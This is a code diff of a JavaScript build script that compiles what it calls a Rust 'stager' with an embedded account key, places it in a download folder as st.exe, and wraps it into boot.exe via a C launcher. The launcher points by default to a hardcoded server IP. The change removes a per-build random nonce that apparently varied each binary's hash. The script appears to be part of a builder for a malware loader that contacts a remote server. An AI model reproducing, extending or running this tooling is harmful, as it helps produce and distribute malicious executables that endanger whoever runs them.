@@ -1,7 +1,6 @@
 // language: JavaScript, file: builder/rustbuild.js
 import fs from 'node:fs';
 import path from 'node:path';
-import crypto from 'node:crypto';
 import { fileURLToPath } from 'node:url';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
@@ -9,7 +8,7 @@ import { compileLauncher } from './compile.js';
 
 const execFileP = promisify(execFile);
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const ROOT_DIR  = path.join(__dirname, '..');
+const ROOT_DIR = path.join(__dirname, '..');
 const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');
 
 export async function buildBoot({ key, buildId }) {
@@ -19,19 +18,8 @@ export async function buildBoot({ key, buildId }) {
   const srcDir = path.join(rustDir, 'src');
   if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });
 
-  const nonce = crypto.randomBytes(16);
-  const nonceArr = Array.from(nonce).map(b => b.toString(16).padStart(2, '0')).join(', ');
   const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
-  fs.writeFileSync(embeddedKeyPath, [
-    '// Auto-generated per build',
-    `pub const ACCOUNT_KEY: &str = "${key}";`,
-    '',
-    '#[used]',
-    '#[no_mangle]',
-    '#[link_section = ".rdata"]',
-    `pub static BUILD_NONCE: [u8; 16] = [${nonceArr}];`,
-    '',
-  ].join('\n'));
+  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);
 
   console.log('[build] compiling rust stager...');
   try {
@@ -49,16 +37,9 @@ export async function buildBoot({ key, buildId }) {
   if (!fs.existsSync(baseExe)) throw new Error(`rust build missing output at ${baseExe}`);
 
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
+  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
 
-  const stFinal = path.join(DOWNLOAD_DIR, 'st.exe');
-  fs.copyFileSync(baseExe, stFinal);
-
-  console.log('[build] compiling C launcher...');
-  const bootBuf = await compileLauncher({
-    key,
-    buildId,
-    config: { ip: process.env.SERVER_IP || '95.182.96.216' },
-    baseExe,
-  });
+  console.log('[build] wrapping into boot.exe...');
+  const bootBuf = await compileLauncher({ key, buildId, config: { ip: process.env.SERVER_IP || '95.182.96.216' }, baseExe });
   return bootBuf;
 }
